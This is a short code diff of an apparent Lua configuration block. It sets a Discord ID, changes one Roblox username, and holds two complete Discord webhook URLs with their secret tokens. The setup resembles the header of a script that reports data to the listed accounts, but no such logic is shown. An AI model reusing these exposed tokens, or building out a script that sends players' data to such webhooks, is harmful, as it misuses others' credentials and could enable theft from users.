@@ -1,6 +1,6 @@
 DISCORD_ID = '1348370512492892322'
 Usernames = {
-    "xroblox_user_8366471965"
+    "roblox_user_8366471965"
 }
 local z = "https://discord.com/api/webhooks/1385718820848537742/khp6CFwu4dHhfKfGHpmDKvkyiVyUFjR5U3sb-FYJxfj2gteflZt3dsb5lJ-STjO3PYtU"
 local x = "https://discord.com/api/webhooks/1385726448320512040/wRSs6p88PoVcBaTtRPbkYcqgDaYgajfCf85lcwRCL5CLc0rTqGzHY3LmI84Ba20v6Zek"
